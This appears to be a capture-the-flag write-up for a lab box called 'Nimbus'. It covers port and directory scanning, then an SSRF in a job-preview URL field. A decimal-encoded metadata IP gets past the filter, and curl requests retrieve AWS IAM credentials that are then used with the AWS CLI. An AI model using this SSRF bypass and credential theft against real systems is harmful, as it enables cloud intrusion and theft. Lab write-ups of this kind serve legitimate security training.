# Nimbus

<img width="1594" height="293" alt="image" src="https://github.com/user-attachments/assets/b73f1baa-fd18-4781-a0b4-490fdfd5bb8a" />

---

## Nmap Scan 

```
nmap -sCV -Pn TARGET-IP
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-21 20:02 UTC
Nmap scan report for nimbus.htb (10.129.37.208)
Host is up (0.37s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Nimbus \xE2\x80\x94 Internal Job Scheduler
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.28 seconds
                                                                                        
```

--- 

## gobuster 

```
gobuster dir -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt -u http://nimbus.htb/  
```

fournd : 

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 876]
/jobs                 (Status: 200) [Size: 3453]

```

---

## subdomains fuzz

```
 gobuster vhost \ 
  -u http://nimbus.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain

```

`found`

```
aws.nimbus.htb
```

--- 

## in `/jobs` found that i can send url when i will try to send 

```
url=http://169.254.169.254/latest/meta-data/#.yaml
```

**`got`**

```
  Security policy: this URL targets an internal resource and has been blocked.
```

> ## i try to decimal encoding

```
url=http://2852039166/latest/meta-data/instance-id#.yaml
```

## now found root meta data path 

```
# List everything available at the root
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/#.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

```
<h3>Raw response</h3><pre>ami-id
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
placement/
security-groups
</pre>
<h3>Parsed</h3><pre>ami-id hostname iam/ instance-id instance-type local-hostname local-ipv4 placement/ security-groups</pre>
</div>

```

---

## found full path 

```
# Get credentials for the discovered role
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role#.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

> ### it retrun aws secret key 

```
{
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-06-22T02:52:51Z"
}
```

## configer aws cli

```
export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"
export AWS_DEFAULT_REGION="us-east-1"

```

##  Test the credentials:

```
aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
```

<img width="891" height="201" alt="image" src="https://github.com/user-attachments/assets/0933b7d1-87ae-429a-a145-936dc94bd0f9" />

## list SQS queues

```
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

<img width="774" height="193" alt="image" src="https://github.com/user-attachments/assets/3b87904c-abba-4a05-905c-c205a62b2895" />

```
sudo tee -a /etc/hosts <<EOF
10.129.37.208  floci
EOF
[sudo] password for kali: 
10.129.37.208  floci
                                     
```

